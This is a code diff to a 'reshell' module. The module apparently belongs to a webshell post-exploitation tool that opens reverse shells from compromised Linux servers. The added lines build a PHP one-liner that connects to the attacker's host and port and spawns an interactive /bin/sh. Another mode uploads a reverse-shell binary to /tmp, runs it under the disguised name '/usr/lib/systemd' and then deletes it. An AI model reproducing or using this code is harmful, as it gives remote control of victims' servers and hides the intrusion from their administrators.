@@ -30,7 +30,7 @@ def run(lhost: str, port: int, mode: int = 0, fakename: str = "/usr/lib/systemd"
     eg: reshell {lhost} {port} {type=[python|upload]{1|2},default = 0 (Python:1 Not Python:2)} {(Only for Mode 2) fakename=/usr/lib/systemd}
     """
     if (is_windows(False) or is_windows()):
-        print(color.red(f"Only for both system is linux."))
+        print(color.red(f"\nOnly for both system is linux\n"))
         return False
     try:
         port = int(port)
@@ -42,22 +42,25 @@ def run(lhost: str, port: int, mode: int = 0, fakename: str = "/usr/lib/systemd"
     print(color.yellow(f"        Please make sure Port {port} open...."))
     if (mode == 0):
         if (has_env("python")):
-            print(color.green(f"Traget has python environment."))
+            print(color.green(f"\nTraget has python environment"))
             MODE == 1
         else:
-            print(color.red(f"Traget has not python environment."))
+            print(color.red(f"\nTraget has not python environment"))
             MODE == 2
     else:
         MODE = int(mode)
 
-    if ("proc_open" in disable_func_list):
-        print(color.red("proc_open is disabled... Try Mode 3"))
-        return
     if (MODE == 1):
-        print(color.yellow(f"Use Mode 1->python"))
-        command = get_php(lhost, port)
+        print(color.yellow(f"\nUse Mode 1->python"))
+        if ("proc_open" in disable_func_list):
+            print(color.yellow(f"\nproc_open is disabled... Try use php command"))
+            command = get_system_code(f"""php -n -r '$sock=fsockopen("{lhost}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'""")
+            if ("No system execute function" in command):
+                print(color.red(f"No system execute function\n"))
+        else:
+            command = get_php(lhost, port)
     else:
-        print(color.yellow(f"Use Mode 2->upload"))
+        print(color.yellow(f"\nUse Mode 2->upload"))
         filename = encrypt(f"{lhost}-{port}")
         if not upload(path.join(gget("root_path"), "auxiliary", "reshell", "reverse_server_x86_64"), "/tmp/%s" % filename, True):
             return
@@ -65,10 +68,10 @@ def run(lhost: str, port: int, mode: int = 0, fakename: str = "/usr/lib/systemd"
     t = Thread(target=delay_send, args=(2, command))
     t.setDaemon(True)
     t.start()
-    print(f"Bind port {color.yellow(str(port))}...")
+    print(f"\nBind port {color.yellow(str(port))}...")
     if (not bind(port, MODE)):
-        print(color.red(f"Bind port error."))
-    if (MODE == 3):
+        print(color.red("\nBind port error\n"))
+    if (MODE == 2):
         res = send(f"unlink('/tmp/{filename}');")
         if (not res):
             return
